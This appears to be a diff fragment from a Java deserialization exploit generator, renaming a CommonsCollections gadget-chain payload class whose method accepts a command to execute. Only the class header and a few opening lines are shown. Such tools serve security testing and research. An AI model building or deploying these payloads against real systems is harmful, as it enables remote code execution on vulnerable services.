@@ -56,7 +56,7 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({ Authors.MEIZJM3I})
-public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
+public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
 
     public BadAttributeValueExpException getObject(final String command) throws Exception {
         final String[] execArgs = new String[] { command };
